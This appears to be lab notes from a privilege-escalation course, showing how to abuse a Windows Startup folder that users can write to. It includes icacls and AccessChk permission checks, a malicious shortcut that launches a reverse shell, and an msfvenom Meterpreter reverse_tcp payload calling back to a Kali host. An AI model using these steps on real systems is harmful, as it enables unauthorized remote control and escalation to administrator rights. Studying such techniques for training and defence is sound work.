
**Example 1:**

1. **Check Startup Directory Permissions Using icacls:**
   ```plaintext
   icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
   ```
   - The output should show that "BUILTIN\Users" or "NT AUTHORITY\INTERACTIVE" has "F" (Full Control) or "M" (Modify) permissions for the directory to be vulnerable.

2. **Check Startup Directory Permissions Using AccessChk:**
   ```plaintext
   C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
   ```

3. **Create Malicious Shortcut:**
   - Use the `CreateShortcut.vbs` script to create a shortcut to `reverse.exe`.

4. **Exploit:**
   - Start a listener on Kali.
   - Simulate admin logon using RDP to trigger the reverse shell.

**Example 2:**

1. **Generate Malicious Executable:**
   ```plaintext
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe
   ```

2. **Copy to Startup Directory:**
   - Place `x.exe` in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`.

3. **Exploit:**
   - Log off and log in as the administrator.
   - Wait for a session in Meterpreter.
